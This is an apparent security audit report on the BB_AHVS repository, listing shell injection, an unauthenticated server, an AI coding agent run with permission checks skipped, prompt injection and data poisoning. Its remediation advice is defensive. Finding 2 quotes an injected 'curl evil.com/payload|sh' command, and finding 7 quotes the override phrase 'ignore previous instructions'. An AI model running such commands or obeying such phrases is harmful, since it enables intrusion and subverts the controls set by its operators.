# Security Analysis Report: BB_AHVS

**Date:** 2026-03-30
**Scope:** Full repository audit
**Methodology:** STRIDE threat model + OWASP Top 10 + manual code review

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 2     |
| High     | 2     |
| Medium   | 3     |
| Low      | 2     |

---

## CRITICAL (2)

### 1. Shell Injection via `shell=True` in eval command execution

**File:** `ahvs/worktree.py:564-566`

```python
proc = subprocess.Popen(cmd, shell=True, ...)
```

The `run_eval_command()` method executes an arbitrary string with `shell=True`. The `eval_command` originates from `baseline_metric.json` and is passed with minimal sanitization. The regex strip at line 539 only removes a leading `cd /path &&` but does not prevent injection via other shell metacharacters (`;`, `|`, backticks, `$()`).

**Impact:** Arbitrary command execution. If an attacker can modify `baseline_metric.json` (or if a malicious repo is onboarded), they get full shell access.

**Recommendation:** Use `shlex.split()` + `subprocess.Popen(args_list, shell=False)`, or at minimum apply `shlex.quote()` to all interpolated values.

---

### 2. Unquoted shell interpolation in import sanity check

**File:** `ahvs/executor.py:842-846`

```python
python_part = f'{env_prefix}{parsed.python_exe} -c "{import_stmt}"'
check_cmd = f"cd {parsed.cd_dir} && {python_part}"
```

`cd_dir`, `env_prefix`, `python_exe`, and `module_name` are all extracted from `eval_command` (lines 618-630) without shell escaping. A crafted `eval_command` like `cd /tmp; curl evil.com/payload|sh && python -m eval` will execute the injected commands.

**Recommendation:** Use `shlex.quote()` for all interpolated values, or refactor to avoid shell execution entirely.

---

## HIGH (2)

### 3. HTTP server bound to `0.0.0.0` with no authentication

**File:** `ahvs/hypothesis_selector.py:411`

```python
server = HTTPServer(("0.0.0.0", port), handler_class)
```

The hypothesis selection GUI binds to all network interfaces with:

- No authentication or authorization
- No CSRF protection
- No `Content-Length` limit on POST body (line 341)
- No validation that submitted hypothesis IDs exist

Any host on the network can POST to `/submit` and manipulate which hypotheses are selected for execution.

**Recommendation:** Bind to `127.0.0.1`. Add a CSRF token or localhost-only check. Validate hypothesis IDs against the known set.

---

### 4. `--dangerously-skip-permissions` on Claude Code invocation

**File:** `ahvs/executor.py:472`

```python
"--dangerously-skip-permissions",
```

Claude Code is invoked with full permission bypass within the worktree. While the tool allowlist at line 471 limits tools to `Read, Edit, Glob, Grep, Bash(git diff:*)`, the `--dangerously-skip-permissions` flag may override these restrictions depending on the Claude Code version. Combined with `--add-dir` pointing at the target repo, this gives the code agent access to any file in the worktree including potential secrets.

**Recommendation:** Remove `--dangerously-skip-permissions` and use explicit permission grants. The secret file scan at lines 337-358 warns but does not block access.

---

## MEDIUM (3)

### 5. TOCTOU race condition in symlink creation

**File:** `ahvs/worktree.py:666-668`

```python
if not wt_item.exists() and not wt_item.is_symlink():
    wt_item.symlink_to(item.resolve())
```

Check-then-act pattern. An attacker with filesystem access could race the existence check and create a symlink to a sensitive file between the check and the `symlink_to()` call. Practical exploitability is low (requires local access + precise timing).

**Recommendation:** Use a try/except around `symlink_to()` and catch `FileExistsError` instead of checking beforehand.

---

### 6. Unvalidated `cd_dir` path can escape worktree

**File:** `ahvs/executor.py:628-630`

```python
cd_dir = cd_parts[1].strip()  # no path validation
```

The extracted `cd_dir` from `eval_command` is never validated to be within the worktree boundary. A value like `../../` or an absolute path escapes the worktree sandbox when used in `check_cmd`.

**Recommendation:** Resolve `cd_dir` and verify `is_relative_to(worktree_path)`.

---

### 7. Prompt injection via `--question` and `eval_command`

**Files:** `ahvs/executor.py:1256+`, `ahvs/prompts.py`

User-controlled `question` and `eval_command` strings are interpolated directly into LLM prompts without sanitization. A crafted question like `"ignore previous instructions and..."` could manipulate hypothesis generation. Impact is bounded because LLM output is validated against schema contracts.

**Recommendation:** Document the trust boundary. Consider adding input length limits and character filtering for the `--question` flag.

---

## LOW (2)

### 8. Evolution store data poisoning

**File:** `ahvs/evolution.py:78-102`

`LessonEntry.from_dict()` accepts unvalidated `metric_baseline/metric_after/metric_delta` values from JSONL files. An attacker with write access to `.ahvs/evolution/lessons.jsonl` could inject misleading lessons that skew future hypothesis generation.

**Recommendation:** Add type and range validation in `from_dict()`.

---

### 9. No `Content-Length` cap on POST body

**File:** `ahvs/hypothesis_selector.py:341`

```python
length = int(self.headers.get("Content-Length", 0))
raw = self.rfile.read(length)
```

Accepts arbitrary payload sizes, enabling memory exhaustion via a large POST payload.

**Recommendation:** Reject requests with `Content-Length` exceeding a reasonable limit (e.g., 64 KB).

---

## Positive findings

| Area | Status |
|------|--------|
| YAML loading | Safe — `yaml.safe_load()` used consistently |
| Path traversal protection | `validate_safe_relpath()` in `worktree.py:28-65` |
| Hardcoded secrets | None — test files use `sk-fake-key`, README uses placeholders |
| API key handling | Via environment variables, not CLI args (not visible in `ps`) |
| Dangerous deserialization | No `pickle`, `eval`, or `exec` on untrusted data |
| Eval output size | Capped at 1 MB in `worktree.py:576` |
| `.gitignore` | Excludes `.env`, `.env.*`, `*.secret` |

---

## Priority remediation plan

| Priority | Finding | File | Effort |
|----------|---------|------|--------|
| P0 | Bind HTTP to `127.0.0.1` | `hypothesis_selector.py:411` | 1 line |
| P0 | `shlex.quote()` all values in import check | `executor.py:842-846` | Small |
| P1 | Refactor `run_eval_command` to avoid `shell=True` | `worktree.py:564` | Medium |
| P1 | Validate `cd_dir` stays within worktree | `executor.py:628-630` | Small |
| P2 | Add CSRF + Content-Length cap to hypothesis selector | `hypothesis_selector.py` | Medium |
| P2 | Remove `--dangerously-skip-permissions` | `executor.py:472` | Small |
